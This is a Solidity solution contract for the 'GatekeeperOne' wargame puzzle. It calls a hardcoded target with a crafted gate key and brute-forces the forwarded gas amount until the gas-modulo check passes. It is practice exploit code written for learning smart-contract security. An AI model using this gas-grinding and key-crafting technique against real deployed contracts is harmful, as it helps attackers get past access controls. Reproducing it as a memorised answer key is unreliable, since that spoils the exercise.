// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "../src/Gatekeeper.sol";

contract GatekeeperSolution {
    GatekeeperOne gk =
        GatekeeperOne(0x108b0fd9d6F668F970e516805d5dFA8C68C114E9);

    function enter() external {
        bytes8 _gateKey = 0x1000000000009e16;

        for (uint256 i = 0; i < 8000; i++) {
            (bool success, ) = address(gk).call{gas: (8191 * 3) + i}(
                abi.encodeWithSignature("enter(bytes8)", _gateKey)
            );
            if (success) {
                break;
            }
        }
    }
}
